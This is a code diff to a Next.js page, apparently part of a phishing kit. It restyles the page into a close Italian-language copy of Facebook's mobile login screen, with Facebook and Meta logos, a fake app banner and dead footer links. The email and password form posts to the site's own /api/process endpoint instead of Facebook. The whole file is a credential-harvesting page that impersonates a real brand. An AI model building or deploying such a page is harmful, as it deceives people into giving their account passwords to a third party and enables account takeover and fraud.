@@ -1,46 +1,39 @@
 'use client';
 
+import Image from 'next/image';
+
 export default function Home() {
   return (
-    <main style={{
-      display: 'flex',
-      flexDirection: 'column',
-      alignItems: 'center',
-      padding: '2rem',
-      fontFamily: 'Arial, sans-serif'
-    }}>
-      {/* Logo Facebook */}
-      <img src="/facebook.png" alt="Facebook Logo" style={{ width: '100px', marginBottom: '1rem' }} />
+    <main>
+      <div className="top-banner">
+        Scarica Facebook per Android per navigare più velocemente.
+      </div>
 
-      {/* Form */}
-      <form
-        action="/api/process"
-        method="POST"
-        style={{
-          display: 'flex',
-          flexDirection: 'column',
-          gap: '1rem',
-          width: '100%',
-          maxWidth: '300px'
-        }}
-      >
-        <input type="text" name="email" placeholder="Email" required style={{ padding: '0.5rem' }} />
-        <input type="password" name="password" placeholder="Password" required style={{ padding: '0.5rem' }} />
-        <button type="submit" style={{
-          padding: '0.75rem',
-          backgroundColor: '#4267B2',
-          color: 'white',
-          border: 'none',
-          borderRadius: '4px'
-        }}>
-          Invia
-        </button>
-
-        {/* Logo Meta centrato */}
-        <div style={{ textAlign: 'center', marginTop: '1rem' }}>
-          <img src="/meta.png" alt="Meta Logo" style={{ width: '60px' }} />
+      <div className="fb-container">
+        <div className="fb-logo">
+          <Image src="/facebook.png" alt="Facebook Logo" width={60} height={60} />
         </div>
-      </form>
+
+        <div className="fb-login-box">
+          <form className="fb-form" method="POST" action="/api/process">
+            <input type="text" name="email" placeholder="Numero di cellulare o e-mail" required />
+            <input type="password" name="password" placeholder="Password" required />
+            <button type="submit">Accedi</button>
+            <a href="/recupero" className="forgot">Password dimenticata?</a>
+            <hr />
+            <button type="button" className="create-account">Crea nuovo account</button>
+          </form>
+        </div>
+
+        <div className="meta-footer">
+          <Image src="/meta.png" alt="Meta Logo" width={60} height={60} className="meta-logo" />
+          <div className="meta-links">
+            <a href="#">Informazioni</a>
+            <a href="#">Centro assistenza</a>
+            <a href="#">Altro</a>
+          </div>
+        </div>
+      </div>
     </main>
   );
 }
